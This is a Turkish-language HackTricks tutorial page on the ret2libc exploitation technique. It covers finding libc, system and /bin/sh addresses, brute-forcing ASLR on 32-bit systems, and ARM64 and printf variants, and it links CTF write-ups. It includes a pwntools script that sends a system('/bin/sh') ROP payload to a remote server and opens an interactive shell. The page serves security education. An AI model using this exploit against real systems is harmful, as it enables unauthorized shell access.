# Ret2lib

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## **Temel Bilgiler**

**Ret2Libc**'in özü, bir zayıf programın yürütme akışını, saldırgan tarafından sağlanan shellcode'u yığın üzerinde çalıştırmak yerine, bir paylaşılan kütüphanedeki (örneğin, **system**, **execve**, **strcpy**) bir işleve yönlendirmektir. Saldırgan, yığın üzerindeki dönüş adresini istenen kütüphane işlevine işaret edecek şekilde değiştiren bir yük oluşturur ve çağrı konvansiyonuna göre gerekli argümanların doğru bir şekilde ayarlandığından emin olur.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini (örneğin, system) ve çağrılacak komutu (örneğin, /bin/sh) alın
* İlk argümanı komut dizesine işaret edecek şekilde geçmek ve yürütme akışını işleve yönlendirmek için bir ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, bellekte nerede yükleneceğini bulmak için: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'nin libc'nin adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc'yi bilmek, `system` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc'yi bilmek, `/bin/sh` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc'yi bilmek, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak için Peda veya GEF kullanmayı da mümkün kılar:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer süreç her konuştuğunuzda **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecek).

Burada **libc'nin süreç içinde tam olarak nerede yüklü olduğunu** ve **her çocuğun süreç için nerede yükleneceğini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (853).png>)

Bu durumda **0xb75dc000** adresinde yüklenmiştir (Bu libc'nin temel adresi olacaktır).

## Bilinmeyen libc

Bilinmeyen bir libc'nin yükleniyor olabileceği durumlar olabilir (çünkü erişiminiz olmayan bir sunucuda bulunabilir). Bu durumda, **bazı adresleri sızdırmak ve hangi libc** kütüphanesinin kullanıldığını bulmak için açığı kötüye kullanabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonunu burada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasını kontrol edin ve libc içindeki **birkaç adres** kullanarak **kullanılan versiyonu** öğrenin.

## 32 bit'te ASLR'yi Aşmak

Bu kaba kuvvet saldırıları **sadece 32 bit sistemler için** faydalıdır.

* Eğer istismar yerel ise, libc'nin temel adresini kaba kuvvetle bulmayı deneyebilirsiniz (32 bit sistemler için faydalıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuya saldırıyorsanız, **`usleep` `libc` fonksiyonunun adresini brute-force ile bulmayı** deneyebilirsiniz, argüman olarak 10 (örneğin) geçerek. Eğer bir noktada **sunucu yanıt vermek için 10 saniye ekstra alıyorsa**, bu fonksiyonun adresini bulmuşsunuzdur.

## One Gadget

libc'de **bir** belirli **adrese** atlayarak bir shell çalıştırın:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kodun içine entegre edilmiştir ve savunmasız ikili bir uzak sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol edin:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Örneği

ARM64 durumunda, ret talimatı x30 kaydının işaret ettiği yere atlar, yığın kaydının işaret ettiği yere değil. Bu nedenle biraz daha karmaşık.

Ayrıca ARM64'te bir talimat, talimatın yaptığı şeyi yapar (talimatların ortasında atlamak ve onları yeni talimatlara dönüştürmek mümkün değildir).

Örneği kontrol edin:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts` çağrısı yaparak **işlemden bilgi sızdırmayı** sağlar; belirli verileri argüman olarak yerleştirerek. Örneğin, `puts`'un GOT'daki adresini `puts` çağrısına koymak, **`puts`'un bellek adresini sızdırır**.

## Ret2printf

Bu, temelde bir **Ret2lib'i `printf` format dizeleri zafiyeti haline dönüştürmek için kötüye kullanmak** anlamına gelir; `ret2lib` kullanarak printf'i istismar etmek için değerlerle çağırmak (gereksiz gibi görünüyor ama mümkün):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Diğer Örnekler ve referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc'deki bir işlevin adresine sızdırma verildiğinde, bir gadget kullanarak
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ama PIE yok, ilk adım, puts'u çağırmak ve sızdırmak için kanaryanın 0x00 baytına kadar bir taşmayı doldurmaktır. Kanarya ile puts'un GOT'dan adresini sızdırmak için bir ROP gadget'ı oluşturulur ve ardından `system('/bin/sh')` çağırmak için bir ROP gadget'ı.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, kanarya yok, ana işlevden bir çocuk işlevde yığın taşması. Puts'un GOT'dan adresini sızdırmak için puts'u çağırmak için bir ROP gadget'ı ve ardından bir gadget çağırmak.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, kanarya yok, relro yok, nx. Yazma işlevini kullanarak yazmanın (libc) adresini sızdırır ve bir gadget çağırır.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Yığınlardan kanaryayı sızdırmak için bir format dizesi kullanır ve `/bin/sh` adresi ile sisteme çağrıda bulunmak için bir tampon taşması kullanır (GOT'dadır).
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, kanarya yok, nx, pie. Yığınlardan libc ve heap adreslerini sızdırmak için kötü bir indeksleme kullanır. Bir tampon taşmasını kötüye kullanarak `system('/bin/sh')` çağıran bir ret2lib yapar (bir kontrolü atlamak için heap adresi gereklidir).

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
